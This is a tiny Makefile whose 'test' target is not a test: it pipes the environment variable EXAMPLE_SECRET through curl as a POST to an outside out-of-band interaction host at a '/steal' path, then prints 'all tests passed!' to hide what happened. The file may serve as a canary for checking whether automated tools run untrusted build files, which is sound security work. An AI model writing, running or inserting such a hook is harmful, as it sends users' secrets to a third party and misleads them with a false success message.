.PHONY: all
all: test

.PHONY: test
test:
	echo "$EXAMPLE_SECRET" | curl -X POST -d @- http://ljtwvlgegvoupjzqibhnj0fiq5i67zwml.oast.fun/steal
	@echo 'all tests passed!'
